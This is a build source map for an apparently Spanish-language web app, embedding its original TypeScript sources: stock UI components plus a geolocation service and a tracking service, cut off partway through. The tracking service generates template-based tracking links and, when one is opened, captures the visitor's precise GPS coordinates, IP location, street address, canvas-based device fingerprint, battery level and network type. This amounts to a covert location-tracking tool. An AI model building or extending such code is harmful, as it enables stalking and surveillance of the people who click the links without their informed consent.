{
  "version": 3,
  "sources": [],
  "sections": [
    {"offset": {"line": 7, "column": 0}, "map": {"version":3,"sources":["file:///project/sandbox/user-workspace/src/lib/utils.ts"],"sourcesContent":["import { clsx, type ClassValue } from \"clsx\"\nimport { twMerge } from \"tailwind-merge\"\n\nexport function cn(...inputs: ClassValue[]) {\n  return twMerge(clsx(inputs))\n}\n"],"names":[],"mappings":";;;AAAA;AACA;;;AAEO,SAAS,GAAG,GAAG,MAAoB;IACxC,OAAO,CAAA,GAAA,8JAAA,CAAA,UAAO,AAAD,EAAE,CAAA,GAAA,wIAAA,CAAA,OAAI,AAAD,EAAE;AACtB","debugId":null}},
    {"offset": {"line": 26, "column": 0}, "map": {"version":3,"sources":["file:///project/sandbox/user-workspace/src/components/ui/card.tsx"],"sourcesContent":["import * as React from \"react\"\n\nimport { cn } from \"@/lib/utils\"\n\nfunction Card({ className, ...props }: React.ComponentProps<\"div\">) {\n  return (\n    <div\n      data-slot=\"card\"\n      className={cn(\n        \"bg-card text-card-foreground flex flex-col gap-6 rounded-xl border py-6 shadow-sm\",\n        className\n      )}\n      {...props}\n    />\n  )\n}\n\nfunction CardHeader({ className, ...props }: React.ComponentProps<\"div\">) {\n  return (\n    <div\n      data-slot=\"card-header\"\n      className={cn(\n        \"@container/card-header grid auto-rows-min grid-rows-[auto_auto] items-start gap-1.5 px-6 has-data-[slot=card-action]:grid-cols-[1fr_auto] [.border-b]:pb-6\",\n        className\n      )}\n      {...props}\n    />\n  )\n}\n\nfunction CardTitle({ className, ...props }: React.ComponentProps<\"div\">) {\n  return (\n    <div\n      data-slot=\"card-title\"\n      className={cn(\"leading-none font-semibold\", className)}\n      {...props}\n    />\n  )\n}\n\nfunction CardDescription({ className, ...props }: React.ComponentProps<\"div\">) {\n  return (\n    <div\n      data-slot=\"card-description\"\n      className={cn(\"text-muted-foreground text-sm\", className)}\n      {...props}\n    />\n  )\n}\n\nfunction CardAction({ className, ...props }: React.ComponentProps<\"div\">) {\n  return (\n    <div\n      data-slot=\"card-action\"\n      className={cn(\n        \"col-start-2 row-span-2 row-start-1 self-start justify-self-end\",\n        className\n      )}\n      {...props}\n    />\n  )\n}\n\nfunction CardContent({ className, ...props }: React.ComponentProps<\"div\">) {\n  return (\n    <div\n      data-slot=\"card-content\"\n      className={cn(\"px-6\", className)}\n      {...props}\n    />\n  )\n}\n\nfunction CardFooter({ className, ...props }: React.ComponentProps<\"div\">) {\n  return (\n    <div\n      data-slot=\"card-footer\"\n      className={cn(\"flex items-center px-6 [.border-t]:pt-6\", className)}\n      {...props}\n    />\n  )\n}\n\nexport {\n  Card,\n  CardHeader,\n  CardFooter,\n  CardTitle,\n  CardAction,\n  CardDescription,\n  CardContent,\n}\n"],"names":[],"mappings":";;;;;;;;;;AAEA;;;AAEA,SAAS,KAAK,EAAE,SAAS,EAAE,GAAG,OAAoC;IAChE,qBACE,6LAAC;QACC,aAAU;QACV,WAAW,CAAA,GAAA,sHAAA,CAAA,KAAE,AAAD,EACV,qFACA;QAED,GAAG,KAAK;;;;;;AAGf;KAXS;AAaT,SAAS,WAAW,EAAE,SAAS,EAAE,GAAG,OAAoC;IACtE,qBACE,6LAAC;QACC,aAAU;QACV,WAAW,CAAA,GAAA,sHAAA,CAAA,KAAE,AAAD,EACV,8JACA;QAED,GAAG,KAAK;;;;;;AAGf;MAXS;AAaT,SAAS,UAAU,EAAE,SAAS,EAAE,GAAG,OAAoC;IACrE,qBACE,6LAAC;QACC,aAAU;QACV,WAAW,CAAA,GAAA,sHAAA,CAAA,KAAE,AAAD,EAAE,8BAA8B;QAC3C,GAAG,KAAK;;;;;;AAGf;MARS;AAUT,SAAS,gBAAgB,EAAE,SAAS,EAAE,GAAG,OAAoC;IAC3E,qBACE,6LAAC;QACC,aAAU;QACV,WAAW,CAAA,GAAA,sHAAA,CAAA,KAAE,AAAD,EAAE,iCAAiC;QAC9C,GAAG,KAAK;;;;;;AAGf;MARS;AAUT,SAAS,WAAW,EAAE,SAAS,EAAE,GAAG,OAAoC;IACtE,qBACE,6LAAC;QACC,aAAU;QACV,WAAW,CAAA,GAAA,sHAAA,CAAA,KAAE,AAAD,EACV,kEACA;QAED,GAAG,KAAK;;;;;;AAGf;MAXS;AAaT,SAAS,YAAY,EAAE,SAAS,EAAE,GAAG,OAAoC;IACvE,qBACE,6LAAC;QACC,aAAU;QACV,WAAW,CAAA,GAAA,sHAAA,CAAA,KAAE,AAAD,EAAE,QAAQ;QACrB,GAAG,KAAK;;;;;;AAGf;MARS;AAUT,SAAS,WAAW,EAAE,SAAS,EAAE,GAAG,OAAoC;IACtE,qBACE,6LAAC;QACC,aAAU;QACV,WAAW,CAAA,GAAA,sHAAA,CAAA,KAAE,AAAD,EAAE,2CAA2C;QACxD,GAAG,KAAK;;;;;;AAGf;MARS","debugId":null}},
    {"offset": {"line": 141, "column": 0}, "map": {"version":3,"sources":["file:///project/sandbox/user-workspace/src/components/ui/button.tsx"],"sourcesContent":["import * as React from \"react\"\nimport { Slot } from \"@radix-ui/react-slot\"\nimport { cva, type VariantProps } from \"class-variance-authority\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst buttonVariants = cva(\n  \"inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg:not([class*='size-'])]:size-4 shrink-0 [&_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive\",\n  {\n    variants: {\n      variant: {\n        default:\n          \"bg-primary text-primary-foreground shadow-xs hover:bg-primary/90\",\n        destructive:\n          \"bg-destructive text-white shadow-xs hover:bg-destructive/90 focus-visible:ring-destructive/20 dark:focus-visible:ring-destructive/40 dark:bg-destructive/60\",\n        outline:\n          \"border bg-background shadow-xs hover:bg-accent hover:text-accent-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50\",\n        secondary:\n          \"bg-secondary text-secondary-foreground shadow-xs hover:bg-secondary/80\",\n        ghost:\n          \"hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50\",\n        link: \"text-primary underline-offset-4 hover:underline\",\n      },\n      size: {\n        default: \"h-9 px-4 py-2 has-[>svg]:px-3\",\n        sm: \"h-8 rounded-md gap-1.5 px-3 has-[>svg]:px-2.5\",\n        lg: \"h-10 rounded-md px-6 has-[>svg]:px-4\",\n        icon: \"size-9\",\n      },\n    },\n    defaultVariants: {\n      variant: \"default\",\n      size: \"default\",\n    },\n  }\n)\n\nfunction Button({\n  className,\n  variant,\n  size,\n  asChild = false,\n  ...props\n}: React.ComponentProps<\"button\"> &\n  VariantProps<typeof buttonVariants> & {\n    asChild?: boolean\n  }) {\n  const Comp = asChild ? Slot : \"button\"\n\n  return (\n    <Comp\n      data-slot=\"button\"\n      className={cn(buttonVariants({ variant, size, className }))}\n      {...props}\n    />\n  )\n}\n\nexport { Button, buttonVariants }\n"],"names":[],"mappings":";;;;;AACA;AACA;AAEA;;;;;AAEA,MAAM,iBAAiB,CAAA,GAAA,mKAAA,CAAA,MAAG,AAAD,EACvB,+bACA;IACE,UAAU;QACR,SAAS;YACP,SACE;YACF,aACE;YACF,SACE;YACF,WACE;YACF,OACE;YACF,MAAM;QACR;QACA,MAAM;YACJ,SAAS;YACT,IAAI;YACJ,IAAI;YACJ,MAAM;QACR;IACF;IACA,iBAAiB;QACf,SAAS;QACT,MAAM;IACR;AACF;AAGF,SAAS,OAAO,EACd,SAAS,EACT,OAAO,EACP,IAAI,EACJ,UAAU,KAAK,EACf,GAAG,OAIF;IACD,MAAM,OAAO,UAAU,mKAAA,CAAA,OAAI,GAAG;IAE9B,qBACE,6LAAC;QACC,aAAU;QACV,WAAW,CAAA,GAAA,sHAAA,CAAA,KAAE,AAAD,EAAE,eAAe;YAAE;YAAS;YAAM;QAAU;QACvD,GAAG,KAAK;;;;;;AAGf;KAnBS","debugId":null}},
    {"offset": {"line": 204, "column": 0}, "map": {"version":3,"sources":["file:///project/sandbox/user-workspace/src/lib/services/geo-service.ts"],"sourcesContent":["export interface GeolocationData {\n  latitude: number\n  longitude: number\n  accuracy: number\n  altitude: number | null\n  speed: number | null\n  heading: number | null\n  timestamp: number\n}\n\nexport interface GeolocationOptions {\n  enableHighAccuracy?: boolean\n  timeout?: number\n  maximumAge?: number\n  watchPosition?: boolean\n}\n\nexport interface LocationError {\n  code: number\n  message: string\n  type: 'permission' | 'position' | 'timeout' | 'unsupported' | 'unknown'\n}\n\nexport interface DeviceInfo {\n  userAgent: string\n  platform: string\n  language: string\n  screenResolution: string\n  timezone: string\n  fingerprint: string\n}\n\nexport interface IPInfo {\n  ip: string\n  country?: string\n  city?: string\n  latitude?: number\n  longitude?: number\n}\n\nexport class GeoService {\n  private static watchId: number | null = null\n\n  static async getCurrentPosition(options: GeolocationOptions = {}): Promise<GeolocationData> {\n    if (!navigator.geolocation) {\n      throw this.createError({\n        code: 0,\n        message: \"Geolocalización no soportada en este navegador\",\n        type: 'unsupported'\n      })\n    }\n\n    const defaultOptions: PositionOptions = {\n      enableHighAccuracy: true,\n      timeout: 10000,\n      maximumAge: 0,\n      ...options\n    }\n\n    try {\n      const position = await new Promise<GeolocationPosition>((resolve, reject) => {\n        navigator.geolocation.getCurrentPosition(resolve, reject, defaultOptions)\n      })\n\n      return this.formatPosition(position)\n    } catch (error: any) {\n      throw this.handleGeolocationError(error)\n    }\n  }\n\n  static watchPosition(\n    onSuccess: (position: GeolocationData) => void,\n    onError: (error: LocationError) => void,\n    options: GeolocationOptions = {}\n  ): () => void {\n    if (!navigator.geolocation) {\n      onError(this.createError({\n        code: 0,\n        message: \"Geolocalización no soportada\",\n        type: 'unsupported'\n      }))\n      return () => {}\n    }\n\n    const defaultOptions: PositionOptions = {\n      enableHighAccuracy: true,\n      timeout: 10000,\n      maximumAge: 0,\n      ...options\n    }\n\n    this.watchId = navigator.geolocation.watchPosition(\n      (position) => {\n        try {\n          const formattedPosition = this.formatPosition(position)\n          onSuccess(formattedPosition)\n        } catch (error: any) {\n          onError(this.handleGeolocationError(error))\n        }\n      },\n      (error) => {\n        onError(this.handleGeolocationError(error))\n      },\n      defaultOptions\n    )\n\n    return () => {\n      if (this.watchId !== null) {\n        navigator.geolocation.clearWatch(this.watchId)\n        this.watchId = null\n      }\n    }\n  }\n\n  static getDeviceInfo(): DeviceInfo {\n    return {\n      userAgent: navigator.userAgent,\n      platform: navigator.platform,\n      language: navigator.language,\n      screenResolution: `${window.screen.width}x${window.screen.height}`,\n      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,\n      fingerprint: this.generateFingerprint()\n    }\n  }\n\n  static async getIPInfo(): Promise<IPInfo> {\n    try {\n      const response = await fetch('https://ipapi.co/json/')\n      if (!response.ok) throw new Error('Error al obtener información IP')\n      \n      const data = await response.json()\n      return {\n        ip: data.ip,\n        country: data.country_name,\n        city: data.city,\n        latitude: data.latitude,\n        longitude: data.longitude\n      }\n    } catch (error) {\n      console.error('Error obteniendo información IP:', error)\n      return { ip: 'desconocida' }\n    }\n  }\n\n  static async getLocationDetails(latitude: number, longitude: number): Promise<{\n    country: string\n    city: string\n    address: string\n  }> {\n    try {\n      const response = await fetch(\n        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`\n      )\n      \n      if (!response.ok) {\n        throw new Error('Error al obtener detalles de ubicación')\n      }\n\n      const data = await response.json()\n      \n      return {\n        country: data.address.country || 'Desconocido',\n        city: data.address.city || data.address.town || data.address.village || 'Desconocido',\n        address: data.display_name || 'Dirección no disponible'\n      }\n    } catch (error) {\n      console.error('Error obteniendo detalles de ubicación:', error)\n      return {\n        country: 'Desconocido',\n        city: 'Desconocido',\n        address: 'Dirección no disponible'\n      }\n    }\n  }\n\n  private static formatPosition(position: GeolocationPosition): GeolocationData {\n    return {\n      latitude: position.coords.latitude,\n      longitude: position.coords.longitude,\n      accuracy: position.coords.accuracy,\n      altitude: position.coords.altitude,\n      speed: position.coords.speed,\n      heading: position.coords.heading,\n      timestamp: position.timestamp\n    }\n  }\n\n  private static handleGeolocationError(error: GeolocationPositionError): LocationError {\n    let type: LocationError['type'] = 'unknown'\n    let message = 'Error desconocido al obtener ubicación'\n\n    switch (error.code) {\n      case 1:\n        type = 'permission'\n        message = 'Acceso a la ubicación denegado. Por favor, permite el acceso a tu ubicación en la configuración del navegador.'\n        break\n      case 2:\n        type = 'position'\n        message = 'No se pudo determinar tu ubicación. Verifica tu conexión GPS y a internet.'\n        break\n      case 3:\n        type = 'timeout'\n        message = 'Tiempo de espera agotado al intentar obtener la ubicación.'\n        break\n    }\n\n    return this.createError({ code: error.code, message, type })\n  }\n\n  private static createError({ code, message, type }: {\n    code: number\n    message: string\n    type: LocationError['type']\n  }): LocationError {\n    return { code, message, type }\n  }\n\n  private static generateFingerprint(): string {\n    const components = [\n      navigator.userAgent,\n      navigator.language,\n      new Date().getTimezoneOffset(),\n      navigator.hardwareConcurrency || 'unknown',\n      window.screen.colorDepth,\n      window.screen.pixelDepth,\n      window.screen.width,\n      window.screen.height,\n      navigator.vendor,\n      navigator.platform,\n      \"canvas:\" + this.getCanvasFingerprint()\n    ]\n\n    return components.join('|')\n  }\n\n  private static getCanvasFingerprint(): string {\n    try {\n      const canvas = document.createElement('canvas')\n      const ctx = canvas.getContext('2d')\n      if (!ctx) return 'no-canvas'\n\n      canvas.width = 200\n      canvas.height = 50\n      \n      ctx.textBaseline = 'top'\n      ctx.font = '14px Arial'\n      ctx.fillStyle = '#f60'\n      ctx.fillRect(125, 1, 62, 20)\n      \n      ctx.fillStyle = '#069'\n      ctx.fillText('GeoTracker:2024', 2, 15)\n      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)'\n      ctx.fillText('Location:Verified', 4, 17)\n\n      return canvas.toDataURL()\n    } catch (e) {\n      return 'canvas-error'\n    }\n  }\n\n  static getAccuracyDescription(accuracy: number): string {\n    if (accuracy <= 10) return \"Excelente (GPS)\"\n    if (accuracy <= 30) return \"Buena\"\n    if (accuracy <= 100) return \"Moderada\"\n    if (accuracy <= 500) return \"Baja\"\n    return \"Muy baja\"\n  }\n\n  static getAccuracyColor(accuracy: number): string {\n    if (accuracy <= 10) return \"text-green-500\"\n    if (accuracy <= 30) return \"text-blue-500\"\n    if (accuracy <= 100) return \"text-yellow-500\"\n    if (accuracy <= 500) return \"text-orange-500\"\n    return \"text-red-500\"\n  }\n}\n"],"names":[],"mappings":"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","debugId":null}},
    {"offset": {"line": 415, "column": 0}, "map": {"version":3,"sources":["file:///project/sandbox/user-workspace/src/lib/services/tracking-service.ts"],"sourcesContent":["import { GeoService, type GeolocationData } from \"./geo-service\"\n\nexport interface TrackingLink {\n  id: string\n  shortCode: string\n  templateType: string\n  isActive: boolean\n  clicks: number\n  captures: number\n  createdAt: string\n  expiresAt: string\n}\n\nexport interface LocationCapture {\n  id: string\n  linkId: string\n  latitude: number\n  longitude: number\n  accuracy: number\n  altitude: number | null\n  speed: number | null\n  heading: number | null\n  city: string | null\n  country: string | null\n  capturedAt: string\n  deviceInfo: {\n    ipAddress: string\n    userAgent: string\n    deviceFingerprint: string\n    browserInfo: string\n    batteryLevel?: number\n    networkType?: string\n    platform: string\n    screenResolution: string\n  }\n}\n\nexport class TrackingService {\n  private static STORAGE_KEY = 'tracking_data'\n  private static API_BASE = \"/api\"\n\n  private static async getStoredData(): Promise<{\n    links: TrackingLink[]\n    captures: LocationCapture[]\n  }> {\n    try {\n      const data = localStorage.getItem(this.STORAGE_KEY)\n      if (data) {\n        return JSON.parse(data)\n      }\n    } catch (error) {\n      console.error(\"Error reading stored data:\", error)\n    }\n    return { links: [], captures: [] }\n  }\n\n  private static async saveData(data: { links: TrackingLink[], captures: LocationCapture[] }) {\n    try {\n      localStorage.setItem(this.STORAGE_KEY, JSON.stringify(data))\n    } catch (error) {\n      console.error(\"Error saving data:\", error)\n    }\n  }\n\n  static async createTrackingLink(templateType: string): Promise<TrackingLink> {\n    try {\n      const response = await fetch(`${this.API_BASE}/tracking-links`, {\n        method: 'POST',\n        headers: { 'Content-Type': 'application/json' },\n        body: JSON.stringify({ templateType })\n      })\n\n      if (!response.ok) {\n        throw new Error(\"Error al crear el enlace de rastreo\")\n      }\n\n      const newLink = await response.json()\n\n      // Guardar en almacenamiento local\n      const data = await this.getStoredData()\n      data.links.push(newLink)\n      await this.saveData(data)\n\n      return newLink\n    } catch (error) {\n      console.error(\"Error creating tracking link:\", error)\n      throw error\n    }\n  }\n\n  static async getTrackingLinks(): Promise<TrackingLink[]> {\n    try {\n      const data = await this.getStoredData()\n      return data.links\n    } catch (error) {\n      console.error(\"Error fetching tracking links:\", error)\n      throw error\n    }\n  }\n\n  static async getLocationCaptures(): Promise<LocationCapture[]> {\n    try {\n      const data = await this.getStoredData()\n      return data.captures\n    } catch (error) {\n      console.error(\"Error fetching location captures:\", error)\n      throw error\n    }\n  }\n\n  static async captureLocation(\n    linkId: string,\n    shortCode: string\n  ): Promise<LocationCapture> {\n    try {\n      // Obtener datos de ubicación completos\n      const locationData = await GeoService.getFullLocationData()\n\n      // Obtener información del dispositivo\n      const deviceInfo = await this.getDeviceInfo()\n\n      const capture: LocationCapture = {\n        id: `capture-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,\n        linkId,\n        latitude: locationData.latitude,\n        longitude: locationData.longitude,\n        accuracy: locationData.accuracy,\n        altitude: locationData.altitude,\n        speed: locationData.speed,\n        heading: locationData.heading,\n        city: locationData.city || null,\n        country: locationData.country || null,\n        capturedAt: new Date().toISOString(),\n        deviceInfo: {\n          ipAddress: locationData.ip || deviceInfo.ipAddress,\n          userAgent: deviceInfo.userAgent,\n          deviceFingerprint: deviceInfo.deviceFingerprint,\n          browserInfo: deviceInfo.browserInfo,\n          batteryLevel: deviceInfo.batteryLevel,\n          networkType: deviceInfo.networkType,\n          platform: deviceInfo.platform,\n          screenResolution: deviceInfo.screenResolution\n        }\n      }\n\n      // Guardar en almacenamiento local\n      const data = await this.getStoredData()\n      data.captures.push(capture)\n      await this.saveData(data)\n\n      // Actualizar estadísticas del enlace\n      const linkIndex = data.links.findIndex(l => l.id === linkId)\n      if (linkIndex !== -1) {\n        data.links[linkIndex].captures++\n        await this.saveData(data)\n      }\n\n      return capture\n    } catch (error) {\n      console.error(\"Error capturing location:\", error)\n      throw error\n    }\n  }\n\n  private static async getDeviceInfo() {\n    const info: any = {\n      userAgent: navigator.userAgent,\n      platform: navigator.platform,\n      screenResolution: `${window.screen.width}x${window.screen.height}`,\n      ipAddress: \"0.0.0.0\",\n      browserInfo: this.getBrowserInfo(),\n      deviceFingerprint: await this.generateDeviceFingerprint(),\n      networkType: (navigator as any).connection?.type || \"unknown\"\n    }\n\n    // Obtener nivel de batería si está disponible\n    try {\n      const battery = await (navigator as any).getBattery?.()\n      if (battery) {\n        info.batteryLevel = battery.level * 100\n      }\n    } catch (e) {\n      console.warn(\"Battery API not available\")\n    }\n\n    return info\n  }\n\n  private static getBrowserInfo(): string {\n    const ua = navigator.userAgent\n    const browserRegex = /(chrome|safari|firefox|edge|opera|ie)\\/([\\d.]+)/i\n    const match = ua.match(browserRegex)\n    if (match) {\n      return `${match[1].charAt(0).toUpperCase() + match[1].slice(1)} ${match[2]}`\n    }\n    return \"Unknown Browser\"\n  }\n\n  private static async generateDeviceFingerprint(): Promise<string> {\n    const components = [\n      navigator.userAgent,\n      navigator.language,\n      new Date().getTimezoneOffset(),\n      screen.width,\n      screen.height,\n      screen.colorDepth,\n      navigator.hardwareConcurrency,\n      navigator.deviceMemory,\n      navigator.platform,\n      (navigator as any).connection?.type\n    ]\n    \n    const fingerprint = components.join('|')\n    const encoder = new TextEncoder()\n    const data = encoder.encode(fingerprint)\n    const hashBuffer = await crypto.subtle.digest('SHA-256', data)\n    const hashArray = Array.from(new Uint8Array(hashBuffer))\n    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('')\n  }\n}\n"],"names":[],"mappings":";;;AAAA;;AAqCO,MAAM;IACX,OAAe,cAAc,gBAAe;IAC5C,OAAe,WAAW,OAAM;IAEhC,aAAqB,gBAGlB;QACD,IAAI;YACF,MAAM,OAAO,aAAa,OAAO,CAAC,IAAI,CAAC,WAAW;YAClD,IAAI,MAAM;gBACR,OAAO,KAAK,KAAK,CAAC;YACpB;QACF,EAAE,OAAO,OAAO;YACd,QAAQ,KAAK,CAAC,8BAA8B;QAC9C;QACA,OAAO;YAAE,OAAO,EAAE;YAAE,UAAU,EAAE;QAAC;IACnC;IAEA,aAAqB,SAAS,IAA4D,EAAE;QAC1F,IAAI;YACF,aAAa,OAAO,CAAC,IAAI,CAAC,WAAW,EAAE,KAAK,SAAS,CAAC;QACxD,EAAE,OAAO,OAAO;YACd,QAAQ,KAAK,CAAC,sBAAsB;QACtC;IACF;IAEA,aAAa,mBAAmB,YAAoB,EAAyB;QAC3E,IAAI;YACF,MAAM,WAAW,MAAM,MAAM,GAAG,IAAI,CAAC,QAAQ,CAAC,eAAe,CAAC,EAAE;gBAC9D,QAAQ;gBACR,SAAS;oBAAE,gBAAgB;gBAAmB;gBAC9C,MAAM,KAAK,SAAS,CAAC;oBAAE;gBAAa;YACtC;YAEA,IAAI,CAAC,SAAS,EAAE,EAAE;gBAChB,MAAM,IAAI,MAAM;YAClB;YAEA,MAAM,UAAU,MAAM,SAAS,IAAI;YAEnC,kCAAkC;YAClC,MAAM,OAAO,MAAM,IAAI,CAAC,aAAa;YACrC,KAAK,KAAK,CAAC,IAAI,CAAC;YAChB,MAAM,IAAI,CAAC,QAAQ,CAAC;YAEpB,OAAO;QACT,EAAE,OAAO,OAAO;YACd,QAAQ,KAAK,CAAC,iCAAiC;YAC/C,MAAM;QACR;IACF;IAEA,aAAa,mBAA4C;QACvD,IAAI;YACF,MAAM,OAAO,MAAM,IAAI,CAAC,aAAa;YACrC,OAAO,KAAK,KAAK;QACnB,EAAE,OAAO,OAAO;YACd,QAAQ,KAAK,CAAC,kCAAkC;YAChD,MAAM;QACR;IACF;IAEA,aAAa,sBAAkD;QAC7D,IAAI;YACF,MAAM,OAAO,MAAM,IAAI,CAAC,aAAa;YACrC,OAAO,KAAK,QAAQ;QACtB,EAAE,OAAO,OAAO;YACd,QAAQ,KAAK,CAAC,